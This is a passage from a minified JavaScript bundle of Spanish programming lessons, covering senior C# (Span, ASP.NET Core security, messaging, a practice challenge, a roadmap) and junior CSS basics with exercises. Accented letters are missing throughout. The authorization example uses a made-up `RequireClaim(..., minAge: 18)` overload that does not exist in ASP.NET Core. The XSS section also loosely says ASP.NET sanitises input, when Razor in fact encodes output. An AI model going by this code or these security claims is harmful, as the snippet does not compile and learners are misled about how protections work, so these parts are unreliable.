var protocolo = span.Slice(0, 4); // "http" - CERO MEMORIA ASIGNADA
\`\`\`
Antes, \`Substring()\` creaba un nuevo string. Ahora \`Slice()\` es gratis.

## 3. Estructuras (Struct vs Class)
*   **Class (Reference Type):** Vive en el Heap. Gestionada por GC.
*   **Struct (Value Type):** Vive en el Stack (generalmente). Copia por valor.
*   **\`ref struct\`:** Structs de alto rendimiento que solo viven en el stack (ej: \`Span<T>\`).

---

### Misin Senior:
Usa BenchmarkDotNet para medir tu cdigo. "Creo que esto es ms rpido" no es vlido. "BenchmarkDotNet dice que esto asigna 0 bytes vs 1KB" s lo es.
`,completed:!1},{id:"csharp-20-seguridad-avanzada",title:"Seguridad Avanzada en ASP.NET Core",level:"senior",content:`# Leccin 20: Seguridad Avanzada en ASP.NET Core

La seguridad empieza por el diseo (Security by Design). En .NET, ASP.NET Core Identity te da una base slida.

## 1. Identity & Autenticacin (JWT + OAuth 2.0)
*   **ASP.NET Core Identity:** Framework completo para gestin de usuarios, roles, claims, confirmacin de email y 2FA. Se integra con EF Core.
*   **JWT (Stateless):** El token viaja en cada request (Bearer). No se guarda sesin en el servidor.
*   \`builder.Services.AddIdentityApiEndpoints<IdentityUser>();\` (Nuevo en .NET 8).

## 2. Autorizacin (Basada en Polticas)
Olvdate de \`[Authorize(Roles="Admin")]\`. Es rgido.
Usa Polticas (\`Policies\`) basadas en Claims (\`Reclamaciones\`).
\`\`\`csharp
builder.Services.AddAuthorization(options => {
    options.AddPolicy("MayorDeEdad", policy => 
        policy.RequireClaim(ClaimTypes.DateOfBirth, minAge: 18));
});

[Authorize(Policy = "MayorDeEdad")] // Mucho ms flexible.
\`\`\`

## 3. OWASP Top 10 (Mitigaciones)
*   **SQL Injection:** EF Core con parmetros (casi imposible inyectar si usas LINQ correctamente). NUNCA concatenes strings en \`FromSqlRaw\`.
*   **XSS (Cross-Site Scripting):** ASP.NET sanitiza input por defecto en Razor/Controllers. Si usas HTML raw, usa \`HtmlEncoder\`.
*   **CORS (Cross-Origin Resource Sharing):** Configura explcitamente los orgenes permitidos. \`AllowAnyOrigin()\` es un riesgo.

---

### Misin Senior:
Encripta secretos (Connection Strings, API Keys) usando **Azure Key Vault** o **User Secrets** en dev. Nunca hardcodees contraseas en el cdigo fuente.
`,completed:!1},{id:"csharp-21-escalabilidad-microservicios",title:"Escalabilidad y Arquitectura Empresarial",level:"senior",content:`# Leccin 21: Escalabilidad y Arquitectura Empresarial

Cuando un servidor ya no alcanza, el sistema se distribuye.

## 1. Patrones de Microservicios (Lo bsico)
El Monolito bien estructurado siempre es mejor que un Monolito Distribuido.
*   **API Gateway (YARP es excelente en C#):** nico punto de entrada. Enruta, balancea y autentica.
*   **Comunicacin Async (Event-Driven):** Los servicios NO se llaman directamente (sncronos). Se envan mensajes.

## 2. Mensajera (RabbitMQ / Azure Service Bus)
*   **RabbitMQ:** Broker ligero, Open Source.
*   **Azure Service Bus:** Nube, gestionado, colas fiables.
*   **MassTransit:** Librera .NET esencial. Abstrae el Broker. No programes contra RabbitMQ directamente.

\`\`\`csharp
// MassTransit (Productor)
await _publishEndpoint.Publish<PedidoCreado>(new { PedidoId = 123 });

// Consumidor (Consumer)
public class PedidoConsumer : IConsumer<PedidoCreado> {
    public async Task Consume(ConsumeContext<PedidoCreado> context) {
        // Procesar pedido asncronamente
    }
}
\`\`\`

## 3. Cach Distribuida (Redis)
Para el estado compartido (Session State, datos lentos). \`IDistributedCache\` integrada en .NET.

---

### Misin Senior:
Implementar **Patrn Outbox** para garantizar consistencia eventual. Guardar el evento en la misma Transaccin DB que el Pedido, y luego un proceso en background (BackgroundService) lo enva al Broker.
`,completed:!1},{id:"csharp-22-practica-senior",title:"Reto de Arquitecto de Sistemas .NET",level:"senior",content:`# Prctica: Reto de Arquitecto de Sistemas .NET

Eres el lder tcnico de "CloudStore". Disea y escribe los ncleos del sistema.

---

## 1. El Core del Dominio (Clean Architecture)
**Consigna:** Implementa la lgica de \`Carrito\` usando DDD puro.
*   Entidad \`Carrito\` (Aggregate Root).
*   Value Object \`Moneda\` (inmutable, valida ISO codes, suma segura).
*   Reglas:
    *   No se pueden agregar tems con precio 0.
    *   Si el total supera $1000, aplica descuento del 10%.
    *   Debe lanzar \`DomainException\` especficas.
*   **Bonus:** Unit Tests con xUnit para validar la lgica pura.

## 2. El Pipeline de MediatR (CQRS)
**Consigna:** Crea el flujo para "Crear Pedido".
*   \`CreateOrderCommand\` (DTO inmutable).
*   \`CreateOrderHandler\` (Lgica de aplicacin).
*   Usa un \`IPipelineBehavior\` (decorador de MediatR) para loguear automticamente el tiempo de ejecucin de cada comando.

## 3. Optimizador de Memoria (Performance)
**Consigna:** Tienes un archivo CSV gigante (simulado) de Strings.
*   Escribe un mtodo que parsee una lnea \`id,nombre,precio\` usando \`ReadOnlySpan<char>\` y \`Memory<T>\` para **NO generar strings intermedios** (Zero Allocation Parsing).
*   Compara con \`string.Split()\` usando BenchmarkDotNet (opcional, terico).

---

### Entregable Esperado:
Una solucin modular (\`CloudStore.Domain\`, \`CloudStore.Application\`, \`CloudStore.Infrastructure\`) donde la dependencia fluya hacia adentro. Cdigo limpio, testeable y performante.
`,completed:!1,isProject:!0},{id:"csharp-23-roadmap-csharp",title:"Roadmap C# - El Ecosistema .NET",level:"senior",content:`# Leccin 23: Roadmap C# - El Ecosistema .NET

.NET es enorme. No intentes aprenderlo todo a la vez. Elige tu camino.

## Camino 1: Backend Enterprise (El estndar)
*   **Junior:** C# Sintaxis, LINQ, SQL Server, APIs bsicas con Controllers.
*   **Semi-Senior:** Entity Framework Core, Dependency Injection, Async/Await, Unit Testing.
*   **Senior:** Microservicios, Docker/Kubernetes, Azure/AWS, Clean Architecture, CQRS, Redis, RabbitMQ.
*   **Frameworks:** ASP.NET Core, SignalR (WebSockets).

## Camino 2: Desktop & Mobile (Cross-Platform)
*   **Tecnologa:** .NET MAUI (Multi-platform App UI) o Avalonia UI.
*   **Objetivo:** Crear una sola app que corra en Windows, Mac, Android y iOS.
*   **Skills:** XAML (Lenguaje de UI), MVVM (Patrn de diseo), DataBinding.
*   **Legacy:** WPF (Windows Presentation Foundation) y WinForms siguen muy vivos en la industria bancaria/industrial.

## Camino 3: Game Development (Unity/Godot)
*   **Motor:** Unity es el motor de videojuegos ms popular del mundo y usa C#. Godot tambin tiene soporte C#.
*   **Skills:** Matemticas (Vectores, Quaterniones), Fsica, Shaders, Optimizacin de memoria (GC es el enemigo aqu).
*   **Diferencia:** En juegos, el patrn "Component" reemplaza a la herencia profunda.

---

### Tu misin ahora:
Elige un proyecto real.
1.  **Backend:** Un clon de Twitter (API Rest + Realtime notifications).
2.  **Desktop:** Un gestor de finanzas personales (SQLite local).
3.  **Juego:** Un clon de Flappy Bird.

Bienvenido a la comunidad .NET!
`,completed:!1}]},Zb={id:"css",title:"CSS3: Estilos y Diseo",description:"Aprende a dar vida a tus pginas web con CSS. Desde colores y fuentes hasta diseos complejos y animaciones.",completed:!1,lessons:[{id:"css-junior-que-es-css",title:"Qu es CSS y cmo funciona la magia?",level:"junior",content:`# Leccin 1: Qu es CSS y cmo funciona la magia?



## 1. El diseador de la web



Si HTML es el esqueleto de tu sitio web (huesos, estructura), **CSS** (Cascading Style Sheets) es la piel, la ropa y el maquillaje.

Sin CSS, todas las webs se veran aburridas, en blanco y negro, como un documento de Word mal hecho.



## 2. Anatoma de una regla CSS



CSS funciona dando "rdenes" a los elementos HTML.

Una regla CSS se ve as:



\`\`\`css

h1 {

    color: red;

    font-size: 20px;

}

\`\`\`



Vamos a desarmarla:

*   **Selector (\`h1\`)**: "A quin quiero cambiar?" (En este caso, a todos los ttulos h1).

*   **Propiedad (\`color\`, \`font-size\`)**: "Qu quiero cambiar?" (El color del texto, el tamao de la letra).

*   **Valor (\`red\`, \`20px\`)**: "Cmo quiero que se vea?" (Rojo, de 20 pxeles).



## 3. La "Cascada" (Cascading)



CSS significa "Hojas de Estilo en Cascada". Por qu cascada?

Porque las reglas caen de arriba a abajo. Si escribes dos reglas contradictorias para el mismo elemento, **ganar la ltima que escribiste**.



\`\`\`css

p {

    color: blue;

}



/* Esta regla sobreescribe a la anterior porque est despus */

p {

    color: green;

}

\`\`\`

*Resultado: Los prrafos sern verdes.*



## 4. Ejercicio Mental

Imagina que eres un decorador.

HTML te dice: "Aqu hay una pared".

CSS le dice: "Pinta esa pared de azul, ponle un cuadro en el centro y haz que brille cuando la toques".



## 5. Prctica Rpida

Crea un archivo \`.html\` simple y piensa qu te gustara cambiar. El color de fondo? El tipo de letra? CSS puede hacer todo eso.

`,completed:!1},{id:"css-junior-formas-aplicar-css",title:"Formas de aplicar CSS",level:"junior",content:`# Leccin 2: Formas de aplicar CSS



## 1. Las tres formas de conectar CSS



Existen tres maneras de decirle al navegador "Oye, usa estos estilos". Algunas son buenas para pruebas rpidas, pero solo una es la profesional.



## 2. Estilos en Lnea (Inline Styles) - *No recomendado*



Escribes CSS directamente dentro de la etiqueta HTML usando el atributo \`style\`.



\`\`\`html

<h1 style="color: blue; font-size: 30px;">Hola Mundo</h1>

\`\`\`



*   **Ventaja:** Rpido para probar algo puntual.

*   **Desventaja:** Ensucia el HTML. Si quieres cambiar el color de 50 ttulos, tendrs que editar 50 lneas. **Evtalo en proyectos reales.**



## 3. Estilos Internos (Internal Styles) - *Para una sola pgina*



Escribes CSS dentro de la etiqueta \`<style>\` en el \`<head>\` de tu archivo HTML.



\`\`\`html

<head>

    <style>

        h1 {

            color: red;

        }

        p {

            font-family: Arial;

        }

    </style>

</head>

\`\`\`



*   **Ventaja:** Todo est en un solo archivo.

*   **Desventaja:** Si tienes 10 pginas web, tendrs que copiar y pegar esos estilos en las 10 pginas. Si cambias algo, dolor de cabeza asegurado.



## 4. Estilos Externos (External Styles) - *La forma profesional!*



Creas un archivo separado con extensin \`.css\` (ej: \`estilos.css\`) y lo enlazas en tu HTML.



**En tu archivo \`estilos.css\`:**

\`\`\`css

body {

    background-color: #f0f0f0;

}

h1 {

    color: green;

}

\`\`\`



**En tu archivo \`index.html\`:**

\`\`\`html

<head>

    <!-- Esta lnea mgica conecta los archivos -->

    <link rel="stylesheet" href="estilos.css">

</head>

\`\`\`



*   **Ventaja Suprema:** Puedes cambiar el diseo de **todo tu sitio web** editando un solo archivo CSS. El navegador guarda el archivo en cach, as que carga ms rpido.



## 5. Ejercicio Prctico

1.  Crea un archivo \`index.html\`.

2.  Crea un archivo \`style.css\`.

3.  Conctalos usando \`<link>\`.

4.  Escribe en el CSS: \`body { background-color: pink; }\`.

5.  Si el fondo de tu pgina se pone rosa, felicidades! Has conectado tu primer CSS externo.

`,completed:!1},{id:"css-junior-selectores-basicos",title:'Selectores Bsicos - "Apuntando al objetivo"',level:"junior",content:`# Leccin 3: Selectores Bsicos - "Apuntando al objetivo"



## 1. El Francotirador del CSS



Para aplicar estilos, primero debes saber "apuntar" al elemento correcto. Los selectores son la mira de tu arma de estilos.



## 2. Selector de Etiqueta (Tag Selector)



Afecta a **todas** las etiquetas de ese tipo.



\`\`\`css

/* Todos los prrafos sern grises */

p {

    color: gray;

}

\`\`\`



## 3. Selector de Clase (Class Selector) - *.hago-esto*



El ms usado por los profesionales. Afecta a cualquier elemento que tenga el atributo \`class="..."\`. Se escribe con un punto \`.\` antes del nombre.



**HTML:**

\`\`\`html

<p class="destacado">Este texto es importante</p>

<p>Este es normal</p>

<button class="destacado">Botn importante</button>

\`\`\`



**CSS:**

\`\`\`css

/* Solo los elementos con class="destacado" se ven as */

.destacado {

    background-color: yellow;

    font-weight: bold;

}

\`\`\`



## 4. Selector de ID (ID Selector) - *#unico*



Afecta a **UN SOLO** elemento especfico. Se escribe con un numeral \`#\`.

Recuerda: Los IDs no deben repetirse en la misma pgina.



**HTML:**

\`\`\`html

<div id="cabecera-principal">...</div>

\`\`\`



**CSS:**

\`\`\`css

#cabecera-principal {

    background-color: black;

    color: white;

}

\`\`\`



*Nota:* Evita usar IDs para estilos si puedes usar clases. Los IDs tienen una "especificidad" muy alta y son difciles de sobreescribir despus.



## 5. Selector Universal (*)



Afecta a **TODO**.



\`\`\`css

* {

    margin: 0;

    padding: 0;

}

\`\`\`

*Se usa mucho para "resetear" los estilos por defecto del navegador.*



## 6. Agrupando Selectores



Si quieres aplicar lo mismo a varias cosas, sepralas por coma.



\`\`\`css

h1, h2, h3 {

    font-family: 'Helvetica', sans-serif;

    color: #333;

}

\`\`\`



## 7. Reto Rpido

1.  Crea tres prrafos.

2.  Al primero ponle una clase \`.rojo\`.

3.  Al segundo ponle un id \`#unico-azul\`.

4.  Al tercero no le pongas nada.

5.  Usa CSS para que el primero sea rojo, el segundo azul y el tercero... verde (usando el selector de etiqueta \`p\`)!

Qu pas con los dos primeros? (Pista: Las clases y IDs tienen prioridad sobre la etiqueta).

`,completed:!1},{id:"css-junior-colores-unidades",title:"Colores y Unidades",level:"junior",content:`# Leccin 4: Colores y Unidades



## 1. Pintando la web (Colores)



CSS te permite definir colores de muchas formas. Las 3 ms comunes son:



### Palabras Clave (Keywords)

Nombres en ingls. Son limitados (aprox 140).

\`color: red;\`

\`background-color: lightblue;\`



### Hexadecimal (Hex)

El mtodo ms clsico. Un cdigo de 6 caracteres que empieza con \`#\`.

\`color: #ff0000;\` (Rojo)

\`color: #000000;\` (Negro)

\`color: #ffffff;\` (Blanco)

*Tip: Casi todos los editores de cdigo (como VS Code) te muestran un selector de color si pasas el mouse por encima.*



### RGB y RGBA

Red, Green, Blue. Valores del 0 al 255.

\`color: rgb(255, 0, 0);\` (Rojo)

**RGBA** agrega "Alpha" (Transparencia). El ltimo nmero va de 0 (invisible) a 1 (slido).

\`background-color: rgba(0, 0, 0, 0.5);\` (Negro semitransparente).



## 2. Midiendo cosas (Unidades)



En HTML no usbamos unidades, pero en CSS son obligatorias. \`width: 50\` no funciona. Debe ser \`width: 50px\`.



### Unidades Absolutas

*   **px (Pxeles):** La ms comn. Un punto en la pantalla. \`font-size: 16px;\`. Es precisa pero no escala si el usuario cambia el tamao de fuente del navegador.



### Unidades Relativas (Las favoritas del diseo responsivo!)

*   **% (Porcentaje):** Relativo al padre.

    Si mi contenedor mide 1000px y yo digo \`width: 50%\`, medir 500px.

    

*   **rem (Root EM):** Relativo al tamao de letra base del navegador (generalmente 16px).

    \`1rem\` = 16px.

    \`2rem\` = 32px.

    \`1.5rem\` = 24px.

    *Esta es la unidad estndar moderna para textos y mrgenes.*



*   **em:** Relativo al tamao de letra de SU PADRE directo. Puede ser confuso (efecto bola de nieve), por eso se prefiere \`rem\`.



*   **vw / vh (Viewport Width / Height):** Relativo al tamao de la ventana del navegador.

    \`height: 100vh\` = Ocupa el 100% de la altura visible de la pantalla. Ideal para secciones de "Hero" (portadas).



## 3. Ejercicio de Colores

Juega con \`rgba\`. Intenta poner un fondo de imagen y encima un texto con un fondo negro semitransparente (\`rgba(0,0,0,0.7)\`) y letras blancas. Vers qu profesional queda!

`,completed:!1},{id:"css-junior-tipografias-texto",title:"Tipografas y Texto",level:"junior",content:`# Leccin 5: Tipografas y Texto



## 1. Ms all de Times New Roman



El texto es el 90% de la web. CSS te da control total sobre cmo se lee.



## 2. Propiedades fundamentales



*   **\`font-family\`**: La fuente.

    \`\`\`css

    body {

        font-family: 'Arial', sans-serif;

    }

    \`\`\`

    *Siempre pon una "familia genrica" al final (\`sans-serif\`, \`serif\`, \`monospace\`) por si la fuente principal falla.*



*   **\`font-size\`**: El tamao.

    \`\`\`css

    p {

        font-size: 1rem; /* aprox 16px */

    }

    \`\`\`



*   **\`font-weight\`**: El grosor (negrita).

    Valores: \`normal\` (400), \`bold\` (700) o nmeros especficos.

    \`\`\`css

    strong {

        font-weight: 700;

    }

    \`\`\`



*   **\`color\`**: El color del texto.

    \`\`\`css

    h1 {

        color: #333;

    }

    \`\`\`



*   **\`text-align\`**: Alineacin.

    Valores: \`left\`, \`center\`, \`right\`, \`justify\`.

    \`\`\`css

    h1 {

        text-align: center;

    }

    \`\`\`



*   **\`line-height\`**: Altura de lnea (espacio entre renglones).

    Vital para la legibilidad. Un valor de \`1.5\` o \`1.6\` suele ser perfecto para prrafos.

    \`\`\`css

    p {

        line-height: 1.6; 

    }

    \`\`\`



*   **\`text-decoration\`**: Decoraciones (subrayado).

    Los enlaces vienen subrayados por defecto. Para quitarlo:

    \`\`\`css

    a {

        text-decoration: none;

    }

    \`\`\`



## 3. Importando Google Fonts



No te limites a las fuentes instaladas en la PC.



1.  Ve a [fonts.google.com](https://fonts.google.com).

2.  Elige una fuente (ej: "Roboto").

3.  Copia el cdigo \`<link>\` que te dan y pgalo en tu \`<head>\` HTML.

4.   sala en tu CSS: \`font-family: 'Roboto', sans-serif;\`.



## 4. Ejercicio de Tipgrafo

Crea una noticia falsa.

1.  Usa una fuente \`serif\` (como Times New Roman o Merriweather) para el cuerpo del texto para que parezca un peridico serio.

2.  Usa una fuente \`sans-serif\` (como Arial o Roboto) oscura y gruesa (\`900\`) para el titular.

3.  Asegura que el texto tenga buen \`line-height\` para que no canse la vista.

`,completed:!1},{id:"css-junior-box-model",title:"El Box Model (Modelo de Caja) - VITAL!",level:"junior",content:`# Leccin 6: El Box Model (Modelo de Caja) - VITAL!



## 1. Todo son cajas



Esta es la leccin **ms importante** de CSS. Si entiendes esto, entiendes el diseo web.

**CADA elemento HTML es una caja rectangular.** Incluso un texto redondo o una imagen circular viven dentro de una caja rectangular invisible.



## 2. Las capas de la cebolla (De adentro hacia afuera)



Imagina un cuadro colgado en la pared.



1.  **Content (Contenido):** La pintura en s (el texto, la imagen). Su tamao se define con \`width\` y \`height\`.

2.  **Padding (Relleno):** El espacio blanco entre la pintura y el marco. Es espacio **interno**. Si el cuadro tiene fondo de color, el padding tambin se pinta de ese color.

3.  **Border (Borde):** El marco del cuadro. Va alrededor del padding.

4.  **Margin (Margen):** El espacio entre este cuadro y el cuadro de al lado. Es espacio **externo** e invisible (nadie puede entrar ah).



## 3. Visualizndolo en CSS



\`\`\`css

div {

    width: 200px;         /* 1. Contenido */

    padding: 20px;        /* 2. Relleno interno */

    border: 5px solid black; /* 3. Borde */

    margin: 50px;         /* 4. Espacio externo */

}

\`\`\`



## 4. El problema matemtico (y la solucin \`box-sizing\`)



Por defecto, si dices \`width: 200px\` y \`padding: 20px\`, el navegador hace esto:

200px (ancho) + 20px (padding izq) + 20px (padding der) = **240px** de ancho total.

Esto rompe los diseos!



**La Solucin Profesional:**

Siempre, en todos tus proyectos, usa esto al principio del CSS:



\`\`\`css

* {

    box-sizing: border-box;

}

\`\`\`



Con \`border-box\`, si dices \`width: 200px\`, la caja medir 200px TOTALES. El navegador restar el padding y el borde automticamente del contenido para que cuadre todo. **Es tu mejor amigo.**



## 5. Ejercicio

Abre las herramientas de desarrollador de tu navegador (F12 o Click derecho -> Inspeccionar).

Ve a la pestaa "Computed" o "Estilos" y busca el diagrama de la caja de colores. Pasa el mouse por encima para ver cunto mide el margen, el borde y el padding de los elementos de tu pgina favorita.

`,completed:!1},{id:"css-junior-display-visibility",title:"Display y Visibilidad",level:"junior",content:`# Leccin 7: Display y Visibilidad



## 1. El comportamiento de las cajas



No todas las cajas se comportan igual. La propiedad \`display\` controla cmo se sienta un elemento en la mesa junto a los otros.



## 2. \`display: block\` (Bloque)

*   Son egostas: Ocupan **todo el ancho** disponible.

*   Empiezan en una lnea nueva.

*   Ejemplos naturales: \`<div>\`, \`<h1>\`, \`<p>\`, \`<section>\`.

*   *Puedes ponerles ancho y alto.*



\`\`\`css

.caja {

    display: block; /* Se apilan uno debajo del otro */

}

\`\`\`



## 3. \`display: inline\` (En lnea)

*   Son sociales: Solo ocupan el **ancho de su contenido**.

*   Se sientan lado a lado con otros elementos.

*   **No** aceptan \`width\`, \`height\`, \`margin-top\` ni \`margin-bottom\`.

*   Ejemplos naturales: \`<span>\`, \`<a>\`, \`<strong>\`.



## 4. \`display: inline-block\` (Hbrido)

*   Lo mejor de los dos mundos.

*   Se sientan lado a lado (como inline).

*   PERO aceptan ancho, alto y mrgenes (como block).

*   *Ideal para botones o tarjetas en cuadrcula simple.*



## 5. \`display: none\` vs \`visibility: hidden\`



Cmo escondo algo?



*   **\`display: none\`**: Desaparece! El elemento se borra visualmente y **deja de ocupar espacio**. Los elementos de abajo suben a ocupar su lugar.

*   **\`visibility: hidden\`**: Se vuelve invisible, pero **sigue ocupando su espacio**. Queda un hueco vaco.



## 6. Ejercicio de Navegacin

Los enlaces \`<a>\` son \`inline\` por defecto (no puedes darles padding vertical cmodamente).

Convierte una lista de enlaces en botones:

\`\`\`css

a {

    display: inline-block; /* Ahora s aceptan padding */

    padding: 10px 20px;

    background: blue;

    color: white;

}

\`\`\`

Observa la diferencia si cambias a \`display: block\` (se podr uno debajo del otro).

`,completed:!1},{id:"css-junior-margin-padding",title:"Margin y Padding (Espaciado)",level:"junior",content:`# Leccin 8: Margin y Padding (Espaciado)



## 1. Cul uso?



Ya vimos qu son en el Box Model, pero cundo usar cul?



*   **Padding (Relleno):**  salo cuando quieres espacio **dentro** del borde. Ejemplo: Quieres que el texto de un botn no toque los bordes del botn.

*   **Margin (Margen):**  salo cuando quieres separar elementos **entre s**. Ejemplo: Quieres espacio entre dos botones o entre una imagen y un texto.



## 2. La notacin del reloj



Tanto margin como padding pueden escribirse de forma resumida (shorthand). El orden sigue las agujas del reloj: **Top (Arriba), Right (Derecha), Bottom (Abajo), Left (Izquierda)**.



**4 valores:**

\`\`\`css

/* Arriba Derecha Abajo Izquierda */

padding: 10px 20px 15px 5px;

\`\`\`



**2 valores (Muy comn):**

\`\`\`css

/* Vertical (Arr/Abj) - Horizontal (Izq/Der) */

margin: 20px 50px;

\`\`\`

*Arriba y abajo tienen 20px. Izquierda y derecha tienen 50px.*



**1 valor:**

\`\`\`css

padding: 10px; /* Todos los lados iguales */

\`\`\`



## 3. Centrar horizontalmente con Margin



El truco ms viejo del libro para centrar un bloque (que tenga un ancho definido):



\`\`\`css

.caja-centrada {

    width: 500px;

    margin-left: auto;

    margin-right: auto;

    /* O ms corto: */

    margin: 0 auto;

}

\`\`\`

*\`auto\` le dice al navegador: "Reparte el espacio sobrante equitativamente a los lados".*



## 4. Colapso de Mrgenes (Margin Collapse)

Un fenmeno extrao: Si tienes un elemento con \`margin-bottom: 20px\` y debajo otro con \`margin-top: 30px\`, el espacio entre ellos NO ser 50px. Ser **30px**.

Los mrgenes verticales se solapan (gana el mayor), no se suman.

*Nota: Esto no pasa con paddings ni con mrgenes horizontales.*

`,completed:!1},{id:"css-junior-bordes-sombras",title:"Bordes y Sombras",level:"junior",content:`# Leccin 9: Bordes y Sombras



## 1. Bordes (\`border\`)



Para definir un borde necesitas 3 cosas: Grosor, Estilo y Color.



\`\`\`css

/* Forma larga */

border-width: 2px;

border-style: solid; /* solid, dashed, dotted, double */

border-color: red;



/* Forma corta (Recomendada) */

border: 2px solid red;

\`\`\`



Tambin puedes poner bordes solo en un lado:

\`border-bottom: 1px solid gray;\` (Muy usado para subrayados o separar secciones).



### Bordes Redondeados (\`border-radius\`)

Para suavizar las esquinas!



\`\`\`css

.caja {

    border-radius: 10px;

}

\`\`\`



*Truco:* Para hacer un crculo perfecto, asegrate de que el elemento sea cuadrado (width = height) y pon \`border-radius: 50%\`.



## 2. Sombras (\`box-shadow\`)



Las sombras dan profundidad (efecto 3D) y hacen que los elementos "salgan" de la pantalla.



Sintaxis:

\`box-shadow: offset-x offset-y blur spread color;\`



\`\`\`css

.tarjeta {

    /* Derecha 5px, Abajo 5px, Difuminado 10px, Color negro semitransparente */

    box-shadow: 5px 5px 10px rgba(0,0,0,0.3);

}

\`\`\`



*   **Offset-x**: Positivo mueve la sombra a la derecha.

*   **Offset-y**: Positivo mueve la sombra abajo.

*   **Blur**: Qu tan borrosa es la sombra. 0 es totalmente ntida y dura.

*   **Color**: Usa siempre \`rgba\` con opacidad baja (0.1 a 0.5) para que se vea natural. Las sombras negras slidas (\`#000\`) se ven muy duras y amateurs.



## 3. Ejercicio de Diseo "Material"

Crea un botn que parezca flotar.

1.  Ponle un color de fondo azul y texto blanco.

2.  Qutale el borde (\`border: none\`).

3.  Dale padding generoso.

4.  Agrega un \`border-radius: 4px\`.

5.  Agrega una sombra suave: \`box-shadow: 0 4px 6px rgba(0,0,0,0.1)\`.

6.  Mira qu diferencia con un botn normal!

`,completed:!1},{id:"css-junior-buenas-practicas-css",title:"Buenas Prcticas Bsicas de CSS",level:"junior",content:`# Leccin 10: Buenas Prcticas Bsicas de CSS



## 1. Mantn tu cdigo limpio



CSS puede volverse un espagueti gigante muy rpido. Sigue estas reglas desde el da 1.



## 2. No uses \`!important\`

Es una bomba atmica. \`!important\` fuerza una regla sobre todas las dems.

Si abusas de esto, luego ser imposible sobreescribir tus propios estilos sin aadir M S \`!important\`.  salo solo en casos de vida o muerte (o para sobreescribir libreras externas rebeldes).



## 3. Evita nombres genricos

No llames a tus clases \`.caja\`, \`.texto\`, \`.rojo\`.

Usa nombres semnticos que describan **qu es** o **para qu sirve**.



*   Mal: \`.grande\` (Qu pasa si maana el diseo cambia y ya no es grande?)

*   Bien: \`.titulo-principal\` o \`.tarjeta-producto\`.



## 4. Agrupa tus estilos

No escribas reglas al azar. Intenta mantener un orden lgico en tu archivo CSS.



\`\`\`css

/* === GENERAL === */

body { ... }

h1, h2 { ... }



/* === HEADER === */

header { ... }

.logo { ... }



/* === PRODUCTOS === */

.tarjeta { ... }

.precio { ... }

\`\`\`



## 5. Usa clases en lugar de IDs

Como vimos, las clases \`.clase\` son reutilizables y tienen una especificidad baja (fcil de manejar). Los IDs \`#id\` son nicos y difciles de sobreescribir. Reserva los IDs para JavaScript o anclas.



## 6. CSS Reset / Normalize

Los navegadores traen estilos por defecto (mrgenes en el body, paddings en listas).

Siempre empieza tus proyectos reseteando lo bsico para que se vea igual en Chrome, Firefox y Safari.



Un reset minimalista moderno:



\`\`\`css

* {

    box-sizing: border-box;

    margin: 0;

    padding: 0;

}



body {

    line-height: 1.5;

    font-family: sans-serif;

}



img {

    max-width: 100%; /* Para que no se salgan del mvil */

    display: block;

}

\`\`\`



## 7. Reto Final del Nivel Junior

Crea una "Landing Page" simple que tenga:

1.  Un reset CSS al inicio.

2.  Un encabezado con fondo de color y texto centrado.

3.  Tres tarjetas de servicios alineadas (usa \`inline-block\` por ahora).

4.  Cada tarjeta debe tener borde redondeado, una sombra suave y cambiar de color al pasar el mouse (investiga la pseudo-clase \`:hover\`, ej: \`.tarjeta:hover { ... }\`).

`,completed:!1},{id:"css-junior-ejercicios",title:"Ejercicios Prcticos: CSS Junior",level:"junior",content:`# Ejercicios Prcticos: CSS Junior



Pon a prueba tus habilidades de estilizado.

Para cada ejercicio, crea un archivo \`index.html\` y un \`style.css\`.



---



## 1. Mi Pgina de Perfil (Profile Card)

**Objetivo:** Dominar texto, colores, bordes y el modelo de caja bsico.



**HTML Base:**

\`\`\`html

<div class="perfil">

    <img src="https://via.placeholder.com/150" alt="Avatar">

    <h1>Tu Nombre</h1>

    <p>Desarrollador Web Junior apasionado por el diseo.</p>

    <a href="#">Contactar</a>

</div>

\`\`\`



**Tu Misin:**

1.  Centra todo el texto.

2.  Haz que la imagen sea redonda (\`border-radius: 50%\`).

3.  Ponle un borde gris fino a la tarjeta completa y un poco de sombra suave.

4.  Dale espacio interno (\`padding\`) para que el texto no toque los bordes.

5.  Convierte el enlace "Contactar" en un botn: fondo azul, texto blanco, sin subrayado, y con bordes redondeados.



---



## 2. Tarjetas de Producto (The Shop)

**Objetivo:** \`display: inline-block\`, \`margin\` y \`hover\`.



**HTML Base:**

\`\`\`html

<div class="producto">

    <h2>Zapatillas Runner</h2>

    <p>Precio: $99</p>

    <button>Comprar</button>

</div>

<div class="producto">

    <h2>Camiseta Sport</h2>

    <p>Precio: $25</p>

    <button>Comprar</button>

</div>

<!-- ...agrega uno mas -->

\`\`\`



**Tu Misin:**

1.  Haz que los productos se muestren uno al lado del otro (no uno debajo del otro). Tip: \`display: inline-block\` y un ancho fijo (ej: \`30%\`).

2.  Dale a cada producto un borde y un \`padding\`.

3.  **Reto:** Haz que cuando pases el mouse por encima de un producto (\`:hover\`), la sombra se haga ms intensa o el borde cambie de color.



---



## 3. Men de Navegacin "Classic"

**Objetivo:** Quitar estilos por defecto de listas y manejar \`display\`.



**HTML Base:**

\`\`\`html

<nav>

    <ul class="menu">

        <li><a href="#">Inicio</a></li>

        <li><a href="#">Servicios</a></li>

        <li><a href="#">Acerca de</a></li>

        <li><a href="#">Contacto</a></li>

    </ul>

</nav>

\`\`\`



**Tu Misin:**

1.  Quita los puntos de la lista (\`list-style: none\`).

2.  Quita el padding y margin por defecto del \`ul\`.

3.  Haz que los elementos \`li\` se pongan en una sola lnea horizontal.

4.  Estiliza los enlaces: quita el subrayado, ponles color blanco y fondo oscuro.

5.  Cambia el color de fondo cuando el usuario pase el mouse.



---



## 4. El Formulario Elegante

**Objetivo:** Estilizar inputs y botones con \`padding\` y bordes.



**HTML Base:**

\`\`\`html

<form class="login-form">

    <h2>Iniciar Sesin</h2>

    <input type="email" placeholder="Tu correo">

    <input type="password" placeholder="Tu contrasea">

    <button type="submit">Entrar</button>

</form>

\`\`\`



**Tu Misin:**

1.  Dale un ancho limitado al formulario (ej: \`300px\`) y cntralo en la pgina con \`margin: 0 auto\`.

2.  Haz que los \`input\` ocupen el 100% del ancho del formulario (\`display: block; width: 100%\`).

3.  Dales \`padding\` interno para que no se vean aplastados.

4.  Ponles un borde suave y redondeado.

5.  Haz que el botn destaque con un color vibrante.



---



## 5. Mini Landing Page "Hero"

**Objetivo:** Integracin final. \`vh\`, fondos y tipografa.



**HTML Base:**

\`\`\`html

<header class="hero">

    <h1>Bienvenido al Futuro</h1>

